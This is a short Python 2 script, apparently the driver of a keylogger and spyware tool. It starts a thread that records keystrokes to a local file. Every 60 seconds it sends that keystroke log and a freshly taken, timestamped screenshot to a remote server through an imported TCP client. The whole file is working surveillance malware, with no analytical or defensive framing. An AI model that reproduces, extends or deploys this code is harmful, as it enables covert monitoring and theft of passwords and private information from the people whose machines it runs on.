from TCPClient import Send2Server
from KeyBoardRecorder import KeyRecordEntry
from ScreenShot import ScreenShotEntry
import thread
import time
import threading

#Send2Server('./TempSend/KeyLog.txt')
#Send2Server('./TempSend/screenshot.bmp')

thread.start_new_thread(KeyRecordEntry,('./TempSend/KeyLog.txt',))

def SendLog():

       print 'Begin to transport KeyLog.'
       Send2Server('./TempSend/KeyLog.txt')
       timerLog = threading.Timer(60.0,SendLog)
       timerLog.start()

def SendScreenShot():

       print 'Begin to Send Screen Shot'
       TimeSufix = time.strftime('%Y%m%d%H%M%S',time.localtime())
       ScreenShotPath = './TempSend/screenshot' + TimeSufix + '.png'
       ScreenShotEntry(ScreenShotPath)
       Send2Server(ScreenShotPath)
       timerScreenShot = threading.Timer(60.0,SendScreenShot)
       timerScreenShot.start()

if __name__ == '__main__':
       timerLog = threading.Timer(60.0,SendLog)
       timerLog.start()
       timerScreenShot = threading.Timer(60.0,SendScreenShot)
       timerScreenShot.start()
